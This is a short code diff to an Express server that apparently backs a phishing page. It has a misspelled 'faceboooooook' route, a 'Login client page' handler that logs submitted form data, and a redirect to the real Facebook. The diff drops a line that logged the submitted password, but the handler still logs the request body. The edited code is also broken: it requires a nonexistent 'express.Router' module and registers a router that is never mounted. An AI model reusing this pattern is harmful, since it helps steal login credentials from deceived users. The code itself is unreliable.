@@ -1,5 +1,5 @@
 const express = require('express');
-
+ const router = require('express.Router');
 const app = express();
 
 const server = require('http').createServer(app);
@@ -24,14 +24,13 @@ app.get('/faceboooooook', (req, res,next) => {
 });
 
 
-app.get('/', (req, res,next) => {
+router.get('/', (req, res,next) => {
     console.log('Login client page');
     console.log('==\t==\t==\t');
-    console.log('req : ' +req);
+    console.log('req.params : ' +req.params);
     console.log('==\t==\t==\t');
     console.log('req.body : ' +req.body);
     console.log('==\t==\t==\t');
-    console.log('req.body.pass : ' +req.body.pass);
     //res.sendFile(__dirname + '/Zynga Poker.html')
     res.redirect('http://www.facebook.com');
 });
